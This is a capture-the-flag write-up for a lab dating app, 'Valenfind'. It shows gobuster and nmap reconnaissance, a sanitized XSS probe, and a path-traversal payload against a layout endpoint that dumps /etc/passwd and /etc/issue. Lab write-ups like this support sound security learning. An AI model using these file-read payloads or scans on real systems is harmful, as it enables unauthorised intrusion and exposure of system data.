# Valenfind
**My Dearest Hacker,**

**There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?**
*The part where it says "I hear the creator only learned to code this year; surely this must be vibe-coded" is very intresting,it could be a hint towards cross site scripting or SLQ injection.* 



## reconnaissance

```
gobuster dir -w directory-list-2.3-medium.txt -u http://10.129.165.53:5000/
login, register, logout, dashboard, my_profile
```
```
nmap -sS -sV 10.129.165.53
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It's a python server!

While creating an account for this website I decided to try adding an alert script in the bio section to check for XSS exploit.
```
<script>alert("helloworld")</script>
```

After creating a account I notcied I can view other peoples profiles. I decided to make another account and click on the account I just made to see if the script worked. The script was sanatized.

*Theres a lot of accounts registered to this site on /dashboard. Cupid stands out the most since its a cupid website plus the bio states "I keep the database secrure. No peeking" So I assume this is where the flag is placed.*

After this reconnaissance I found nothing intresting so i decide to look into inspect element. 

-  Inspect element | N/A
-  Debugger | N/A
-  NETWORK | ```GET http://10.129.165.53:5000/api/fetch_layout?layout=theme_classic.html```

Looks like there's a possible LFI exploit! Let's start digging, in my notes in web hacking we can use ```../../../../etc/passwd``` to find directories!

BINGO!

*root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin*

Might be useful ../../../../etc/issue - Ubuntu 24.04.3 LTS \n \l 





  


